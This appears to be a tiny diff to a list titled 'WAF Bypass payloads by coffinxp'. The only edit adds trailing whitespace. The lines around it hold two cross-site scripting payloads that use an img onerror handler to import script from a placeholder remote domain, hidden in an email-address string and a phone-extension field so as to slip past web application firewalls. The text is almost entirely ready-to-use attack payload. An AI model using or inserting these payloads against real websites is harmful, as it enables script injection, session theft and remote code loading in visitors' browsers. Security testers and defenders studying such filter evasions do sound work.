@@ -1,4 +1,4 @@
-WAF Bypass payloads by coffinxp:
+WAF Bypass payloads by coffinxp: 
 
 "><img/src/onerror=import('//domain/')>"@yourdomain
 013371337;ext=<img/src/onerror=import('//domain/')>
